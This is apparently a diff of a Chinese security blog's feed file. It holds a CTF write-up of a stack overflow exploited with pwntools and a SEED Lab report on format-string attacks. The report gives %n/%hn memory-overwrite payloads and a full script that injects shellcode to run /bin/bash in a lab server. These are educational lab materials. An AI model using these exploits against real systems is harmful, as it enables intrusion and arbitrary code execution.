-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ~/.local/bin/checksec ./get_started_3dsctf_2016</span><br><span class="line">[*] &#x27;/home/bronya/Documents/ctf/pwn/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到为32位程序，只开了nx防护。</p>
-</li>
-<li><p>ida工具打开程序，反编译，有主要函数<code>main</code>，<code>get_flag</code></p>
-<p><code>main</code>：</p>
-<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/main.png" alt="main"></p>
-<p><code>get_flag</code>：</p>
-<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/get_flag.png" alt="get_flag"></p>
-<p>存在漏洞点为<code>main</code>函数中的<code>gets(v4)</code>，因此可以通过此进行栈溢出将返回地址改为<code>get_flag</code>函数地址，获取flag</p>
-</li>
-<li><p>在本地测试成功，但是进行远程测试出现问题，发现远程程序崩溃了，应该是因为栈的数据被破坏，导致程序无法完整运行：</p>
-<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/%E8%BF%9C%E7%A8%8B-%E6%9C%89%E9%97%AE%E9%A2%98.png" alt="远程-有问题"></p>
-</li>
-<li><p>考虑在<code>get_flag</code>后加上<code>exit</code>函数以及<code>get_flag</code>所需的两个参数，使其正常完成并退出。</p>
-<p>构造python脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 25523)</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span></span><br><span class="line">retn = <span class="number">0x08048A40</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x8048A3B&#x27;)</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>, get_flag, exit)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>成功获取flag</p>
-<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/results.png" alt="results"></p>
-</li>
-<li><p>另外还有一种思路是程序中存在mprotect函数，可以修改程序中某一段地址的读写执行权限，因此可以将某段bss地址修改，并写入shellcode，令程序跳转到bss地址即可拿到shell。</p>
-</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>【SEED Lab2.0】Return_to_Libc实验报告</title>
     <url>/posts/53f1e8f.html</url>
     <content><![CDATA[<h3 id="Task1：Finding-out-the-Addresses-of-libc-Functions"><a href="#Task1：Finding-out-the-Addresses-of-libc-Functions" class="headerlink" title="Task1：Finding out the Addresses of libc Functions"></a>Task1：Finding out the Addresses of libc Functions</h3><ol>
@@ -605,6 +567,139 @@
         <tag>PWN</tag>
         <tag>Return to Libc</tag>
         <tag>SEED Lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>get_started_3dsctf_2016 WriteUp</title>
+    <url>/posts/3d8ffbc0.html</url>
+    <content><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul>
+<li>对栈溢出函数带参数的溢出理解</li>
+</ul>
+<h2 id="解题内容"><a href="#解题内容" class="headerlink" title="解题内容"></a>解题内容</h2><ol>
+<li><p>使用<code>checksec</code>工具查看基本信息：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ ~/.local/bin/checksec ./get_started_3dsctf_2016</span><br><span class="line">[*] &#x27;/home/bronya/Documents/ctf/pwn/get_started_3dsctf_2016/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到为32位程序，只开了nx防护。</p>
+</li>
+<li><p>ida工具打开程序，反编译，有主要函数<code>main</code>，<code>get_flag</code></p>
+<p><code>main</code>：</p>
+<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/main.png" alt="main"></p>
+<p><code>get_flag</code>：</p>
+<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/get_flag.png" alt="get_flag"></p>
+<p>存在漏洞点为<code>main</code>函数中的<code>gets(v4)</code>，因此可以通过此进行栈溢出将返回地址改为<code>get_flag</code>函数地址，获取flag</p>
+</li>
+<li><p>在本地测试成功，但是进行远程测试出现问题，发现远程程序崩溃了，应该是因为栈的数据被破坏，导致程序无法完整运行：</p>
+<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/%E8%BF%9C%E7%A8%8B-%E6%9C%89%E9%97%AE%E9%A2%98.png" alt="远程-有问题"></p>
+</li>
+<li><p>考虑在<code>get_flag</code>后加上<code>exit</code>函数以及<code>get_flag</code>所需的两个参数，使其正常完成并退出。</p>
+<p>构造python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./get_started_3dsctf_2016&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node4.buuoj.cn&quot;, 25523)</span></span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x080489B8</span></span><br><span class="line">exit = <span class="number">0x0804E6A0</span></span><br><span class="line">retn = <span class="number">0x08048A40</span></span><br><span class="line">a1 = <span class="number">0x308CD64F</span></span><br><span class="line">a2 = <span class="number">0x195719D1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x8048A3B&#x27;)</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span>, get_flag, exit)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>成功获取flag</p>
+<p><img src="/images/2023-11-10-get_started_3dsctf_2016_WriteUp/images/results.png" alt="results"></p>
+</li>
+<li><p>另外还有一种思路是程序中存在mprotect函数，可以修改程序中某一段地址的读写执行权限，因此可以将某段bss地址修改，并写入shellcode，令程序跳转到bss地址即可拿到shell。</p>
+</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>格式化字符串实验报告</title>
+    <url>/posts/5a0832a9.html</url>
+    <content><![CDATA[<h2 id="1-Overview"><a href="#1-Overview" class="headerlink" title="1 Overview"></a>1 Overview</h2><p><code>printf</code>函数用于根据指定格式打印出字符串，第一个参数诶格式化字符串<code>format string</code>，格式化字符串中使用了<code>%</code>来作为占位符。如果不使用<code>%</code>占位符而是直接将变量放入格式化字符串，则存在格式化字符串漏洞，可能被恶意利用。</p>
+<h2 id="2-Environment-Setup"><a href="#2-Environment-Setup" class="headerlink" title="2 Environment Setup"></a>2 Environment Setup</h2><h3 id="2-1-Turning-of-Countermeasure"><a href="#2-1-Turning-of-Countermeasure" class="headerlink" title="2.1 Turning of Countermeasure"></a>2.1 Turning of Countermeasure</h3><p>关闭ASLR</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0</span><br><span class="line">kernel.randomize_va_space = 0</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-The-Vulnerable-Program"><a href="#2-2-The-Vulnerable-Program" class="headerlink" title="2.2 The Vulnerable Program"></a>2.2 The Vulnerable Program</h3><p>漏洞程序如下</p>
+<p><code>format.c</code>：<code>myprintf</code>存在漏洞<code>printf(msg)</code>;</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">myprintf</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the rbp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movq %%rbp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.16lx\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">long</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *framep;</span><br><span class="line">    <span class="comment">// Save the ebp value into framep</span></span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span>(framep));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Frame Pointer (inside myprintf):      0x%.8x\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>) framep);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (before): 0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line has a format-string vulnerability</span></span><br><span class="line">    <span class="built_in">printf</span>(msg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.16lx\n&quot;</span>, target);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The target variable&#x27;s value (after):  0x%.8x\n&quot;</span>,   target);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Compilation</strong>：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ cd server-code</span><br><span class="line">❯ make</span><br><span class="line">gcc -o server server.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -static -m32 -o format-32 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack  -o format-64 format.c</span><br><span class="line">format.c: In function ‘myprintf’:</span><br><span class="line">format.c:44:5: warning: format not a string literal and no format arguments [-Wformat-security]</span><br><span class="line">   44 |     printf(msg);</span><br><span class="line">      |     ^~~~~~</span><br><span class="line">❯ make install</span><br><span class="line">cp server ../fmt-containers</span><br><span class="line">cp format-* ../fmt-containers</span><br></pre></td></tr></table></figure>
+
+<p>可以看到编译中gcc会警告存在格式化字符串漏洞</p>
+<h3 id="2-3-Container-Setup-and-Commands"><a href="#2-3-Container-Setup-and-Commands" class="headerlink" title="2.3 Container Setup and Commands"></a>2.3 Container Setup and Commands</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dcbuild</span><br><span class="line">dcup</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-Task-1-Crashing-the-Program"><a href="#3-Task-1-Crashing-the-Program" class="headerlink" title="3 Task 1: Crashing the Program"></a>3 Task 1: Crashing the Program</h2><p>首先尝试向10.9.0.5发送hello消息</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211150919446.png" alt="image-20231211150919446"></p>
+<p>server端结果</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211150812716.png" alt="image-20231211150812716"></p>
+<p>服务器最多接受1500字节的数据，在此任务中，需要构造payload让程序崩溃（服务器不会崩溃，因为format程序是server的子进程）</p>
+<p>构造payload：<code>%s</code>，发现服务器端没有输出，程序成功crash</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211151346427.png" alt="image-20231211151346427"></p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211151405655.png" alt="image-20231211151405655"></p>
+<h2 id="4-Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#4-Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="4 Task 2: Printing Out the Server Program’s Memory"></a>4 Task 2: Printing Out the Server Program’s Memory</h2><p>继续使用10.9.0.5，令服务器打印出内存中数据</p>
+<h3 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h3><p>打印栈上数据，需要知道需要多少个<code>%.8x</code>占位符，才能使服务器程序打印出输入的前四个字节。</p>
+<p>构造python脚本，设定前四个字节为<code>0xffffffff</code>，构造100个<code>%.8x.</code>，令服务器端打印100个地址，查看前四个字节的位置。</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211152629169.png" alt="image-20231211152629169"></p>
+<p>可以看到，<code>0xffffffff</code>位于第64个<code>%.8x.</code>处。</p>
+<h3 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h3><p>堆上存储着一个秘密值，可以通过服务器端输出查找到，目标为打印出secret秘密值</p>
+<p>由服务器端输出可以知道secret的地址为<code>0x080b4008</code>，因此将buffer的前四个字节设置为secret的地址，通过<code>%s</code>令服务器输出该地址的值。</p>
+<p>构造python脚本如下:</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211153657826.png" alt="image-20231211153657826"></p>
+<p>结果如上图，成功输出<code>A secret message</code>字符串</p>
+<h2 id="5-Task-3-Modifying-the-Server-Program’s-Memory"><a href="#5-Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="5 Task 3: Modifying the Server Program’s Memory"></a>5 Task 3: Modifying the Server Program’s Memory</h2><p>继续使用10.9.0.5，目标为修改0x11223344地址的值。</p>
+<h3 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value."></a>Task 3.A: Change the value to a different value.</h3><p>更改值即可，由服务器端输出可知<code>target</code>地址为<code>0x080e5068</code>，可以通过<code>%n</code>修改地址的值，构造payload。</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">63</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出如下图，可见<code>target</code>成功被修改为了前面输出字符的个数(4+4+63*9)&#x3D;575&#x3D;0x23f</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211154137419.png" alt="image-20231211154137419"></p>
+<h3 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h3><p>0x5000-0x23f &#x3D;  19905 因此需要增加19905个字符。</p>
+<p>构造<code>payload</code>如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.19914x&quot;</span> + <span class="string">&quot;%n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功修改值为0x5000</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211160234002.png" alt="image-20231211160234002"></p>
+<h3 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD."></a>Task 3.C: Change the value to 0xAABBCCDD.</h3><p>值比较大，因此如果使用<code>%n</code>会导致输出时间过长，甚至可能卡死，因此需要使用<code>%hn</code>或<code>%hhn</code>一次只修改两个或一个字节。</p>
+<p>如果使用<code>%hn</code>构造payload，一次只修改两字节，则需要先修改值较小的地址，然后才能修改值较高的地址。</p>
+<p>构造前八个字节分别对应<code>0xAABB</code>和<code>0xCCDD</code>的地址，并且构造payload对两个地址的值分别进行修改：<code>0xaabb - 0x23f + 9 - 4 = 43137</code>， <code>0xccdd - 0xaabb = 8738</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialize the content array</span></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line">number  = <span class="number">0x080e5068</span> <span class="comment"># target地址（小端法，读两个字节就是0x5068）</span></span><br><span class="line">number_1 = number + <span class="number">2</span>   <span class="comment"># target前2个字节地址</span></span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number_1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.43137x&quot;</span> + <span class="string">&quot;%hn&quot;</span> +<span class="string">&quot;%.8738x&quot;</span>  +<span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to badfile</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>成功修改成目标值</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211164056253.png" alt="image-20231211164056253"></p>
+<h2 id="6-Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#6-Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="6 Task 4: Inject Malicious Code into the Server Program"></a>6 Task 4: Inject Malicious Code into the Server Program</h2><h3 id="6-1-Understanding-the-Stack-Layout"><a href="#6-1-Understanding-the-Stack-Layout" class="headerlink" title="6.1 Understanding the Stack Layout"></a>6.1 Understanding the Stack Layout</h3><p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211164407343.png" alt="image-20231211164407343"></p>
+<p><strong>Question 1: What are the memory addresses at the locations marked by 2 and 3?</strong></p>
+<p>  ②是函数<code>myprintf</code>的返回地址，地址应为<code>frame pointer+4 = 0xffffcfac</code>③是<code>buf</code>的起始地址，可以从服务器输出直接获得：<code>0xffffd080</code></p>
+<p><strong>Question 2: How many %x format specifiers do we need to move the format string argument pointerto 3? Remember, the argument pointer starts from the location above 1.</strong></p>
+<p>由上文可知，buf的前四字节需要64个%x才可以达到。</p>
+<h3 id="6-3-Your-Task"><a href="#6-3-Your-Task" class="headerlink" title="6.3 Your Task"></a>6.3 Your Task</h3><p>获取server的shell。</p>
+<p>需要修改函数<code>myprintf</code>的返回地址为<code>shellcode</code>地址，将<code>shellcode</code>放在buf末尾，然后使用上文的方法将shellcode地址写入返回地址即可：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32-bit Generic Shellcode </span></span><br><span class="line">shellcode_32 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">   <span class="string">&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">   <span class="string">&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 64-bit Generic Shellcode </span></span><br><span class="line">shellcode_64 = (</span><br><span class="line">   <span class="string">&quot;\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48&quot;</span></span><br><span class="line">   <span class="string">&quot;\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31&quot;</span></span><br><span class="line">   <span class="string">&quot;\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;/bin/bash*&quot;</span></span><br><span class="line">   <span class="string">&quot;-c*&quot;</span></span><br><span class="line">   <span class="comment"># The * in this line serves as the position marker         *</span></span><br><span class="line">   <span class="string">&quot;/bin/ls -l; echo &#x27;===== Success! ======&#x27;                  *&quot;</span></span><br><span class="line">   <span class="string">&quot;AAAAAAAA&quot;</span>   <span class="comment"># Placeholder for argv[0] --&gt; &quot;/bin/bash&quot;</span></span><br><span class="line">   <span class="string">&quot;BBBBBBBB&quot;</span>   <span class="comment"># Placeholder for argv[1] --&gt; &quot;-c&quot;</span></span><br><span class="line">   <span class="string">&quot;CCCCCCCC&quot;</span>   <span class="comment"># Placeholder for argv[2] --&gt; the command string</span></span><br><span class="line">   <span class="string">&quot;DDDDDDDD&quot;</span>   <span class="comment"># Placeholder for argv[3] --&gt; NULL</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">1500</span></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Choose the shellcode version based on your target</span></span><br><span class="line">shellcode = shellcode_32</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = N - <span class="built_in">len</span>(shellcode)               <span class="comment"># Change this number</span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#    Construct the format string here</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">############################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte integer at offset 0</span></span><br><span class="line">shellcode_addr = <span class="number">0xffffd5d4</span>  <span class="comment"># 0xffffd080 + start</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line">number  = <span class="number">0xffffcfa8</span> + <span class="number">4</span></span><br><span class="line">number_1 = number + <span class="number">2</span> </span><br><span class="line">content[<span class="number">0</span>:<span class="number">4</span>]  =  (number).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">content[<span class="number">8</span>:<span class="number">12</span>] = (number_1).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"><span class="comment"># This line shows how to store a 4-byte string at offset 4</span></span><br><span class="line">content[<span class="number">4</span>:<span class="number">8</span>]  =  (<span class="string">&quot;abcd&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This line shows how to construct a string s with</span></span><br><span class="line"><span class="comment">#   12 of &quot;%.8x&quot;, concatenated with a &quot;%n&quot;</span></span><br><span class="line">s = <span class="string">&quot;%.8x.&quot;</span>*<span class="number">62</span> + <span class="string">&quot;%.54170x&quot;</span>  + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;%.10795x&quot;</span> + <span class="string">&quot;%hn&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The line shows how to store the string s at offset 8</span></span><br><span class="line">fmt  = (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">content[<span class="number">12</span>:<span class="number">12</span>+<span class="built_in">len</span>(fmt)] = fmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save the format string to file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>
+
+<p>成功执行shellcode。</p>
+<p><img src="/images/2023-12-11-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.assets/image-20231211170251532.png" alt="image-20231211170251532"></p>
